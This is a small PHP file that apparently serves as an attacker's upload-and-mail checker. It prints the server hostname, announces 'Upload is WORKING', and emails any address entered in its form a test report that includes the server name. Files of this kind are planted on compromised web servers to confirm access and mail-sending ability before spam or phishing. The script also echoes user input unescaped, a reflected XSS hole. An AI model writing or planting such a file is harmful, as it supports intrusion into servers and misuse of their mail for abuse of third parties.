<?php
error_reporting(0);

?>
 <?php
echo gethostname();
?> 
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="GET">
<input type="text" name="email" value=""required >
<input type="submit" value="Send test >>"Mbut>
</form>
<br>
<?php
if (!empty($_GET['email'])){
$xx = rand();

$ipp=$_SERVER['SERVER_NAME'];
$ip = getHostByName(getHostName());

mail($_GET['email'],"Result Report Test - ".$xx,"Link:$ipp");
print "<b>send an report to [".$_GET['email']."] - $xx</b>"; 
}
?>